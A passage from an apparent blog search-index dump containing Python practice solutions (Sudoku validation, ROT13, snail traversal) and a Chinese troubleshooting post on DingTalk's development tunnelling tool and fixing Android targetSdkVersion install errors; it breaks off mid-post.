class=\"string\">&quot;flour&quot;</span>: <span class=\"number\">500</span>, <span class=\"string\">&quot;sugar&quot;</span>: <span class=\"number\">200</span>, <span class=\"string\">&quot;eggs&quot;</span>: <span class=\"number\">1</span>&#125;, &#123;<span class=\"string\">&quot;flour&quot;</span>: <span class=\"number\">1200</span>, <span class=\"string\">&quot;sugar&quot;</span>: <span class=\"number\">1200</span>, <span class=\"string\">&quot;eggs&quot;</span>: <span class=\"number\">5</span>, <span class=\"string\">&quot;milk&quot;</span>: <span class=\"number\">200</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(c1)</span><br><span class=\"line\">c1 = cakes(&#123;<span class=\"string\">&quot;apples&quot;</span>: <span class=\"number\">3</span>, <span class=\"string\">&quot;flour&quot;</span>: <span class=\"number\">300</span>, <span class=\"string\">&quot;sugar&quot;</span>: <span class=\"number\">150</span>, <span class=\"string\">&quot;milk&quot;</span>: <span class=\"number\">100</span>, <span class=\"string\">&quot;oil&quot;</span>: <span class=\"number\">100</span>&#125;, &#123;<span class=\"string\">&quot;sugar&quot;</span>: <span class=\"number\">500</span>, <span class=\"string\">&quot;flour&quot;</span>: <span class=\"number\">2000</span>, <span class=\"string\">&quot;milk&quot;</span>: <span class=\"number\">2000</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(c1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"p5\"><a href=\"#p5\" class=\"headerlink\" title=\"p5\"></a>p5</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"comment\"># def alphanumeric(password):</span></span><br><span class=\"line\"><span class=\"comment\">#     return re.search(&#x27;^[0-9a-zA-Z]&#123;1,&#125;$&#x27;, password) is not None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> cffi.backend_ctypes <span class=\"keyword\">import</span> xrange</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alphanumeric</span>(<span class=\"params\">string</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> string.isalnum()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(alphanumeric(<span class=\"string\">&quot;PassW0rd&quot;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(alphanumeric(<span class=\"string\">&quot;hello world_&quot;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(alphanumeric(<span class=\"string\">&quot;    &quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def valid_solution(board):</span></span><br><span class=\"line\"><span class=\"comment\">#     i = 0</span></span><br><span class=\"line\"><span class=\"comment\">#     while i &lt; 9:</span></span><br><span class=\"line\"><span class=\"comment\">#         j = 0</span></span><br><span class=\"line\"><span class=\"comment\">#         while j &lt; 9:</span></span><br><span class=\"line\"><span class=\"comment\">#             l1 = []</span></span><br><span class=\"line\"><span class=\"comment\">#             for k in range(i, i+3):</span></span><br><span class=\"line\"><span class=\"comment\">#                 for h in range(j, j+3):</span></span><br><span class=\"line\"><span class=\"comment\">#                     l1.append(board[k][h])</span></span><br><span class=\"line\"><span class=\"comment\">#             l1.sort()</span></span><br><span class=\"line\"><span class=\"comment\">#             if l1 != [1, 2, 3, 4, 5, 6, 7, 8, 9]:</span></span><br><span class=\"line\"><span class=\"comment\">#                 return False</span></span><br><span class=\"line\"><span class=\"comment\">#             j += 3</span></span><br><span class=\"line\"><span class=\"comment\">#         i += 3</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     for p in board:</span></span><br><span class=\"line\"><span class=\"comment\">#         if sorted(p) != [1, 2, 3, 4, 5, 6, 7, 8, 9]:</span></span><br><span class=\"line\"><span class=\"comment\">#             return False</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     m = 0</span></span><br><span class=\"line\"><span class=\"comment\">#     while m &lt; 9:</span></span><br><span class=\"line\"><span class=\"comment\">#         n = 0</span></span><br><span class=\"line\"><span class=\"comment\">#         l2 =[]</span></span><br><span class=\"line\"><span class=\"comment\">#         while n &lt; 9:</span></span><br><span class=\"line\"><span class=\"comment\">#             l2.append(board[n][m])</span></span><br><span class=\"line\"><span class=\"comment\">#             n += 1</span></span><br><span class=\"line\"><span class=\"comment\">#         if sorted(l2) != [1, 2, 3, 4, 5, 6, 7, 8, 9]:</span></span><br><span class=\"line\"><span class=\"comment\">#             return False</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#         m += 1</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     return True</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二：</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">valid_solution</span>(<span class=\"params\">board</span>):</span><br><span class=\"line\">    valid = <span class=\"built_in\">set</span>(<span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> board:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">set</span>(row) != valid: <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> [[row[i] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> board] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>)]:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">set</span>(col) != valid: <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">set</span>(<span class=\"built_in\">sum</span>([row[x * <span class=\"number\">3</span>:(x + <span class=\"number\">1</span>) * <span class=\"number\">3</span>] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> board[y * <span class=\"number\">3</span>:(y + <span class=\"number\">1</span>) * <span class=\"number\">3</span>]], [])) != valid:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [</span><br><span class=\"line\">  [<span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>],</span><br><span class=\"line\">  [<span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">  [<span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">  [<span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>],</span><br><span class=\"line\">  [<span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">  [<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">  [<span class=\"number\">9</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">  [<span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">6</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>],</span><br><span class=\"line\">  [<span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">list2 = [</span><br><span class=\"line\">  [<span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>],</span><br><span class=\"line\">  [<span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">  [<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">0</span>],</span><br><span class=\"line\">  [<span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>],</span><br><span class=\"line\">  [<span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">  [<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">  [<span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">  [<span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">6</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>],</span><br><span class=\"line\">  [<span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">v1 = valid_solution(list1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(v1)</span><br><span class=\"line\">v1 = valid_solution(list2)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(v1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;----------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def rot13(message):</span></span><br><span class=\"line\"><span class=\"comment\">#     str1 = &#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#     for i in message:</span></span><br><span class=\"line\"><span class=\"comment\">#         if 65 &lt;= ord(i) &lt;= 90 and 65 &lt;= ord(i)+13 &lt;= 90:</span></span><br><span class=\"line\"><span class=\"comment\">#             str1 += chr(ord(i)+13)</span></span><br><span class=\"line\"><span class=\"comment\">#         elif 97 &lt;= ord(i) &lt;= 122 and 97 &lt;= ord(i)+13 &lt;= 122:</span></span><br><span class=\"line\"><span class=\"comment\">#             str1 += chr(ord(i) + 13)</span></span><br><span class=\"line\"><span class=\"comment\">#         elif 65 &lt;= ord(i) &lt;= 90 and (90 &lt; ord(i)+13):</span></span><br><span class=\"line\"><span class=\"comment\">#             str1 += chr(ord(i)+13-26)</span></span><br><span class=\"line\"><span class=\"comment\">#         elif 97 &lt;= ord(i) &lt;= 122 and (ord(i)+13 &gt; 122):</span></span><br><span class=\"line\"><span class=\"comment\">#             str1 += chr(ord(i) + 13 - 26)</span></span><br><span class=\"line\"><span class=\"comment\">#         else:</span></span><br><span class=\"line\"><span class=\"comment\">#             str1 += i</span></span><br><span class=\"line\"><span class=\"comment\">#     return str1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rot13</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>((<span class=\"number\">65</span> <span class=\"keyword\">if</span> c.isupper() <span class=\"keyword\">else</span> <span class=\"number\">97</span>) + ((<span class=\"built_in\">ord</span>(c) - (<span class=\"number\">65</span> <span class=\"keyword\">if</span> c.isupper() <span class=\"keyword\">else</span> <span class=\"number\">97</span>)) + <span class=\"number\">13</span>)%<span class=\"number\">26</span>) <span class=\"keyword\">if</span> c.isalpha() <span class=\"keyword\">else</span> c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> message)</span><br><span class=\"line\"></span><br><span class=\"line\">m1 = rot13(<span class=\"string\">&#x27;test&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\">m1 = rot13(<span class=\"string\">&#x27;Test&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;----------------------------------------------------------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def snail(snail_map):</span></span><br><span class=\"line\"><span class=\"comment\">#     list1 = []</span></span><br><span class=\"line\"><span class=\"comment\">#     i = 0</span></span><br><span class=\"line\"><span class=\"comment\">#     j = 0</span></span><br><span class=\"line\"><span class=\"comment\">#     n = 0</span></span><br><span class=\"line\"><span class=\"comment\">#     l = len(snail_map)</span></span><br><span class=\"line\"><span class=\"comment\">#     f1 = True</span></span><br><span class=\"line\"><span class=\"comment\">#     f2 = True</span></span><br><span class=\"line\"><span class=\"comment\">#     f3 = True</span></span><br><span class=\"line\"><span class=\"comment\">#     while l &gt; 0:</span></span><br><span class=\"line\"><span class=\"comment\">#         while f1:</span></span><br><span class=\"line\"><span class=\"comment\">#             while f2:</span></span><br><span class=\"line\"><span class=\"comment\">#                 while f3:</span></span><br><span class=\"line\"><span class=\"comment\">#                     while j &lt; l:</span></span><br><span class=\"line\"><span class=\"comment\">#                         list1.append(snail_map[i][j])</span></span><br><span class=\"line\"><span class=\"comment\">#                         j += 1</span></span><br><span class=\"line\"><span class=\"comment\">#                     i += 1</span></span><br><span class=\"line\"><span class=\"comment\">#                     if i &lt; l:</span></span><br><span class=\"line\"><span class=\"comment\">#                         list1.append(snail_map[i][j-1])</span></span><br><span class=\"line\"><span class=\"comment\">#                     else:</span></span><br><span class=\"line\"><span class=\"comment\">#                         f3 = False</span></span><br><span class=\"line\"><span class=\"comment\">#                 j -= 1</span></span><br><span class=\"line\"><span class=\"comment\">#                 if j == 0:</span></span><br><span class=\"line\"><span class=\"comment\">#                     f2 = False</span></span><br><span class=\"line\"><span class=\"comment\">#                 else:</span></span><br><span class=\"line\"><span class=\"comment\">#                     list1.append(snail_map[i-1][j-1])</span></span><br><span class=\"line\"><span class=\"comment\">#             i -= 1</span></span><br><span class=\"line\"><span class=\"comment\">#             if i == 0:</span></span><br><span class=\"line\"><span class=\"comment\">#                 f1 = False</span></span><br><span class=\"line\"><span class=\"comment\">#             else:</span></span><br><span class=\"line\"><span class=\"comment\">#                 list1.append(snail_map[i][j])</span></span><br><span class=\"line\"><span class=\"comment\">#         n += 1</span></span><br><span class=\"line\"><span class=\"comment\">#         l = len(snail_map) - n</span></span><br><span class=\"line\"><span class=\"comment\">#     return list1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法一</span></span><br><span class=\"line\"><span class=\"comment\"># def snail(array):</span></span><br><span class=\"line\"><span class=\"comment\">#     ret = []</span></span><br><span class=\"line\"><span class=\"comment\">#     if array and array[0]:</span></span><br><span class=\"line\"><span class=\"comment\">#         size = len(array)</span></span><br><span class=\"line\"><span class=\"comment\">#         for n in xrange((size + 1) // 2):</span></span><br><span class=\"line\"><span class=\"comment\">#             for x in xrange(n, size - n):</span></span><br><span class=\"line\"><span class=\"comment\">#                 ret.append(array[n][x])</span></span><br><span class=\"line\"><span class=\"comment\">#             for y in xrange(1 + n, size - n):</span></span><br><span class=\"line\"><span class=\"comment\">#                 ret.append(array[y][-1 - n])</span></span><br><span class=\"line\"><span class=\"comment\">#             for x in xrange(2 + n, size - n + 1):</span></span><br><span class=\"line\"><span class=\"comment\">#                 ret.append(array[-1 - n][-x])</span></span><br><span class=\"line\"><span class=\"comment\">#             for y in xrange(2 + n, size - n):</span></span><br><span class=\"line\"><span class=\"comment\">#                 ret.append(array[-y][n])</span></span><br><span class=\"line\"><span class=\"comment\">#     return ret</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法二:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># def snail(array):</span></span><br><span class=\"line\"><span class=\"comment\">#     out = []</span></span><br><span class=\"line\"><span class=\"comment\">#     while len(array):</span></span><br><span class=\"line\"><span class=\"comment\">#         out += array.pop(0)</span></span><br><span class=\"line\"><span class=\"comment\">#         array = list(zip(*array))[::-1] # Rotate</span></span><br><span class=\"line\"><span class=\"comment\">#     return out</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法三:</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">snail</span>(<span class=\"params\">array</span>):</span><br><span class=\"line\">    next_dir = &#123;<span class=\"string\">&quot;right&quot;</span>: <span class=\"string\">&quot;down&quot;</span>, <span class=\"string\">&quot;down&quot;</span>:<span class=\"string\">&quot;left&quot;</span>, <span class=\"string\">&quot;left&quot;</span>:<span class=\"string\">&quot;up&quot;</span>, <span class=\"string\">&quot;up&quot;</span>:<span class=\"string\">&quot;right&quot;</span>&#125;</span><br><span class=\"line\">    <span class=\"built_in\">dir</span> = <span class=\"string\">&quot;right&quot;</span></span><br><span class=\"line\">    snail = []</span><br><span class=\"line\">    <span class=\"keyword\">while</span> array:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">dir</span> == <span class=\"string\">&quot;right&quot;</span>:</span><br><span class=\"line\">            snail.extend(array.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">dir</span> == <span class=\"string\">&quot;down&quot;</span>:</span><br><span class=\"line\">            snail.extend([x.pop(-<span class=\"number\">1</span>) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> array])</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">dir</span> == <span class=\"string\">&quot;left&quot;</span>:</span><br><span class=\"line\">            snail.extend(<span class=\"built_in\">list</span>(<span class=\"built_in\">reversed</span>(array.pop(-<span class=\"number\">1</span>))))</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">dir</span> == <span class=\"string\">&quot;up&quot;</span>:</span><br><span class=\"line\">            snail.extend([x.pop(<span class=\"number\">0</span>) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(array)])</span><br><span class=\"line\">        <span class=\"built_in\">dir</span> = next_dir[<span class=\"built_in\">dir</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> snail</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">l11 = [[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>],[<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>],[<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]]</span><br><span class=\"line\">n1 = snail(l11)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(n1)</span><br></pre></td></tr></table></figure>\n\n","categories":["python"],"tags":["练习"]},{"title":"疑难解答-common","url":"/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-common/","content":"<h1 id=\"内网穿透之HTTP穿透\"><a href=\"#内网穿透之HTTP穿透\" class=\"headerlink\" title=\"内网穿透之HTTP穿透\"></a>内网穿透之HTTP穿透</h1><p><strong>注意</strong></p>\n<ul>\n<li>本工具不保证稳定性，仅适用于开发测试阶段，禁止当作公网。如线上应用使用本工具造成稳定性问题，由开发者承担负责。如果使用本工具传播违法不良信息，钉钉将追究法律责任。</li>\n<li>线上环境使用请开通企业版，内容请参考<a href=\"https://open.dingtalk.com/abilities/138\">内网应用安全上钉钉</a>。</li>\n</ul>\n<h2 id=\"内网穿透示意图\"><a href=\"#内网穿透示意图\" class=\"headerlink\" title=\"内网穿透示意图\"></a>内网穿透示意图</h2><p><img src=\"https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/9904269951/p163821.png\" alt=\"内网穿透\"></p>\n<h2 id=\"启动内网穿透\"><a href=\"#启动内网穿透\" class=\"headerlink\" title=\"启动内网穿透\"></a>启动内网穿透</h2><p>你可以使用以下两种方式启动内网穿透。</p>\n<h3 id=\"使用DingTalk-Design-CLI启动内网穿透\"><a href=\"#使用DingTalk-Design-CLI启动内网穿透\" class=\"headerlink\" title=\"使用DingTalk Design CLI启动内网穿透\"></a>使用DingTalk Design CLI启动内网穿透</h3><ol>\n<li><p>执行以下命令，下载DingTalk Design CLI工具。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install dingtalk-design-cli@latest -g</span><br></pre></td></tr></table></figure></li>\n<li><p>执行以下命令，检测是否成功安装。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ding -v</span><br></pre></td></tr></table></figure></li>\n<li><p>执行以下命令，启动钉钉内网穿透。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ding ngrok --subdomain dingabcde --port 8080</span><br></pre></td></tr></table></figure>\n\n<p>执行完该命令后，你访问<code>http://dingabcde.vaiwan.cn/xxxxx</code>都会映射到<code>http://127.0.0.1:8080/xxxxx</code>。</p>\n<p>关于DingTalk Design CLI更详细介绍请参考<a href=\"https://open.dingtalk.com/document/resourcedownload/introduction\">DingTalk Design CLI简介</a>。</p>\n</li>\n</ol>\n<h3 id=\"从GitHub下载内网穿透工具\"><a href=\"#从GitHub下载内网穿透工具\" class=\"headerlink\" title=\"从GitHub下载内网穿透工具\"></a>从GitHub下载内网穿透工具</h3><ol>\n<li><p>执行以下git命令，下载内网穿透工具。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/open-dingtalk/dingtalk-pierced-client.git </span><br></pre></td></tr></table></figure></li>\n<li><p>执行以下命令，启动工具。</p>\n<ul>\n<li><p>Windows执行以下命令：</p>\n<p><strong>说明</strong> </p>\n<p>Windows需使用cmd工具打开命令行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd windows_64</span><br><span class=\"line\">ding -config=ding.cfg -subdomain=abc 8080</span><br></pre></td></tr></table></figure></li>\n<li><p>MAC执行以下命令：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd mac</span><br><span class=\"line\">chmod <span class=\"number\">777</span> ./ding</span><br><span class=\"line\">./ding -config=./ding.<span class=\"property\">cfg</span> -subdomain=abc <span class=\"number\">8080</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>启动后界面如下图所示：</p>\n<p>启动完客户端后，你访问<code>http://abc.vaiwan.``cn``/xxxxx</code>都会映射到<code>http://127.0.0.1:8080/xxxxx</code>。</p>\n</li>\n</ol>\n<p><strong>参数说明：</strong></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-config</td>\n<td>内网穿透的配置文件，按照命令示例固定为钉钉提供的./ding.cfg，无需修改</td>\n</tr>\n<tr>\n<td>-subdomain</td>\n<td>您需要使用的域名前缀，该前缀将会匹配到“vaiwan.cn”前面，例如你的subdomain是abcde，启动工具后会将abc.vaiwan.cn映射到本地。</td>\n</tr>\n<tr>\n<td>端口</td>\n<td>您需要代理的本地服务http-server端口，例如你本地端口为8080等</td>\n</tr>\n</tbody></table>\n<p><strong>注意</strong></p>\n<ul>\n<li>若出现<a href=\"http://abc.vaiwan.cn:8082则表示subdomain参数被占用。\">http://abc.vaiwan.cn:8082则表示subdomain参数被占用。</a></li>\n<li>需要访问的域名是<a href=\"http://abc.vaiwan.cn/xxxxx\">http://abc.vaiwan.cn/xxxxx</a> 而不是<a href=\"http://abc.vaiwan.cn:8080/xxxxx\">http://abc.vaiwan.cn:8080/xxxxx</a></li>\n<li>启动命令的subdomain参数有可能被别人占用，尽量不要用常用字符，可以用自己公司名的拼音，例如：alibaba、dingding等。</li>\n<li>可以在本地起个http-server服务，放置一个index.html文件，然后访问<a href=\"http://abc.vaiwan.cn/index.html%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B%E3%80%82\">http://abc.vaiwan.cn/index.html测试一下。</a></li>\n</ul>\n<h1 id=\"AppNinja一文解决-targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具\"><a href=\"#AppNinja一文解决-targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具\" class=\"headerlink\" title=\"AppNinja一文解决:targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具\"></a>AppNinja一文解决:targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法，附带打包修改工具</h1><p> 解决targetSdkVersion版本过低安装失败，安装apk提示版本太低，targetsdkversion修改方法</p>\n<p>直接上解决办法：</p>\n<p> 一、打包错误 AndroidManifest.xml:1: error: No resource identifier found for attribute ‘compileSdkVersionCodename’ in package ‘android’</p>\n<p>解决方法：在AndroidManifest.xml中删除’compileSdkVersionCodename相关的。</p>\n<p>二、安装错误 adb install -r SystemActivities.apk Performing Streamed Install adb: failed to install SystemActivities.apk: Failure [INSTALL_FAILED_OLDER_SDK: Failed parse during installPackageLI: /data/app/vmdl1716187195.tmp/base.apk (at Binary XML file line #0): Requires newer sdk version #28 (current version is #27)]</p>\n<p>解决方法： 用apkide打开后，找到 apktool.yml文件，将其中的sdk版本号降级</p>\n<p>详细说明：</p>\n<p>为了让应用程序指定可以运行的版本，Android的manifest文件中提供了<uses-sdk>标签。该标签中有三个属性，分别是minSdkVersion，targetSdkVersion，maxSdkVersion。</p>\n<p>Android:minSdkVersion —— 此属性决定你的应用能兼容的最低的系统版本，一盘情况是必须设置此属性。</p>\n<p>android:targetSdkVersion —— 此属性说明你当前的应用是针对某一个系统版本开发设计的，也就是说在这个系统版本上运行是没有任何问题的。对于手机或其他终端设备会根据此属性值，决定是否显示一些特性和效果。当然对于开发者最直接的影响就是，你所用到的API都是基于此版本上的，高于此targetSdkVersion的API在使用的时候会有警告或者错误提示。</p>\n<p>android:maxSdkVersion —— 此属性是决定你的应用能支持的版本最高是多少，超过此版本的系统将不能使用你的应用。</p>\n<p>APK打包的时候经常碰到类似 targetSdkVersion 版本的问题.</p>\n<p>一、APKIDE APK打包编译错误</p>\n<p>正在编译Apk… 